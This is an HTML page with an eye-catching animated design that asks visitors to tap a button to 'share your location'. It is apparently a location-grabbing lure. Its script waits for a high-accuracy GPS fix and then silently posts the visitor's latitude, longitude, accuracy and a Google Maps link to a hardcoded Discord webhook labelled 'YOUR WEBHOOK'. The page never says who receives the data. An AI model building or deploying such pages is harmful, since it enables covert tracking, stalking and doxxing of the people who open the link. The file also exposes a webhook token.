<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Location</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 40px 20px;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
    background-size: 200% 200%;
    animation: bgShift 8s ease infinite;
    color: #fff;
    text-align: center;
  }

  @keyframes bgShift {
    0%   { background-position: 0% 50%; }
    50%  { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
  }

  /* Rainbow animated heading */
  h2 {
    font-size: 24px;
    margin-bottom: 30px;
    background: linear-gradient(90deg, #ff0080, #ff8c00, #ffd700, #00ff88, #00d4ff, #a855f7, #ff0080);
    background-size: 300% 100%;
    -webkit-background-clip: text;
    background-clip: text;
    -webkit-text-fill-color: transparent;
    animation: rainbow 4s linear infinite;
    font-weight: 800;
    line-height: 1.4;
  }

  @keyframes rainbow {
    0%   { background-position: 0% 50%; }
    100% { background-position: 300% 50%; }
  }

  /* Glowing gradient button */
  button {
    padding: 18px 44px;
    font-size: 19px;
    font-weight: 700;
    color: #fff;
    border: none;
    border-radius: 50px;
    cursor: pointer;
    background: linear-gradient(135deg, #ff6a00, #ee0979, #ff6a00);
    background-size: 200% 200%;
    animation: btnShift 3s ease infinite;
    box-shadow: 0 0 20px rgba(255, 106, 0, 0.6), 0 8px 25px rgba(0,0,0,0.3);
    transition: transform 0.15s, box-shadow 0.15s;
  }

  @keyframes btnShift {
    0%   { background-position: 0% 50%; }
    50%  { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
  }

  button:hover:not(:disabled) {
    transform: scale(1.06);
    box-shadow: 0 0 35px rgba(255, 106, 0, 0.9), 0 10px 30px rgba(0,0,0,0.4);
  }

  button:active:not(:disabled) { transform: scale(0.97); }

  button:disabled {
    background: #888;
    animation: none;
    box-shadow: none;
    cursor: not-allowed;
  }

  #status {
    margin-top: 28px;
    font-size: 16px;
    line-height: 1.7;
    color: #fff;
    text-shadow: 0 1px 4px rgba(0,0,0,0.4);
    max-width: 340px;
  }

  .good { color: #4ade80; font-weight: 800; text-shadow: 0 0 8px #4ade80; }
  .bad  { color: #ff5c5c; font-weight: 800; text-shadow: 0 0 8px #ff5c5c; }
</style>
</head>
<body>

<h2>Tap the button to share your location</h2>
<button id="btn" onclick="start()">📍 Allow Location</button>
<p id="status"></p>

<script>
/* ====== YOUR WEBHOOK ====== */
const WEBHOOK_URL = "https://discord.com/api/webhooks/1565701454948466708/bWEwIk6LXOXrXul2pzNwrYm5l5jlgDaFyd4Mp9auCwyK8ZH8_7L_TsK_1p1s5XuGhRkG";

/* ====== Accuracy settings ====== */
const TARGET_ACCURACY = 5;      // meters — send as soon as accuracy <= 5m
const MAX_WAIT_MS     = 45000;  // give up after 45s and send the best we have
const MIN_ACCURACY    = 3000;   // ignore fixes worse than 3 km

const btn    = document.getElementById("btn");
const status = document.getElementById("status");

let best = null;
let watchId = null;
let timer = null;
let sent = false;

function start() {
  btn.disabled = true;
  status.textContent = "Getting location… stay still and keep this page open.";

  if (!navigator.geolocation) {
    status.textContent = "This browser does not support location.";
    btn.disabled = false;
    return;
  }

  watchId = navigator.geolocation.watchPosition(onPosition, onError, {
    enableHighAccuracy: true,
    timeout: 20000,
    maximumAge: 0
  });

  timer = setTimeout(() => {
    if (!sent) {
      if (best) finish("⏰ Time is up — sending the best result we got.");
      else {
        stopWatch();
        status.textContent = "No location in time. Go outdoors or near a window and try again.";
        btn.disabled = false;
      }
    }
  }, MAX_WAIT_MS);
}

function onPosition(pos) {
  const acc = pos.coords.accuracy;
  if (acc > MIN_ACCURACY) return;

  if (!best || acc < best.coords.accuracy) best = pos;

  status.innerHTML =
    "Current accuracy: <span class='" + (acc <= TARGET_ACCURACY ? "good" : "bad") + "'>" +
    Math.round(acc) + " m</span><br>" +
    (acc <= TARGET_ACCURACY
      ? "✅ Good enough — sending…"
      : "⏳ Improving… please wait a few more seconds.");

  if (acc <= TARGET_ACCURACY && !sent) finish("✅ High-accuracy location obtained.");
}

function onError(err) {
  if (err.code === err.PERMISSION_DENIED) {
    stopWatch();
    status.textContent = "❌ Permission denied. Allow location in browser settings and try again.";
    btn.disabled = false;
  }
}

function finish(msg) {
  if (sent || !best) return;
  sent = true;
  stopWatch();

  const lat = best.coords.latitude;
  const lon = best.coords.longitude;
  const acc = Math.round(best.coords.accuracy);

  status.innerHTML = msg + "<br>Final accuracy: <span class='good'>" + acc + " m</span><br>Sending…";

  fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      content:
        "**📍 Location received**\n" +
        "Latitude: `" + lat + "`\n" +
        "Longitude: `" + lon + "`\n" +
        "Accuracy: **" + acc + " m**\n" +
        "Map: https://www.google.com/maps?q=" + lat + "," + lon
    })
  })
  .then(() => status.innerHTML += "<br>✅ Sent! You can close this page.")
  .catch(e => status.innerHTML += "<br>❌ Send failed: " + e);
}

function stopWatch() {
  if (watchId !== null) { navigator.geolocation.clearWatch(watchId); watchId = null; }
  if (timer) { clearTimeout(timer); timer = null; }
}
</script>
</body>
</html>
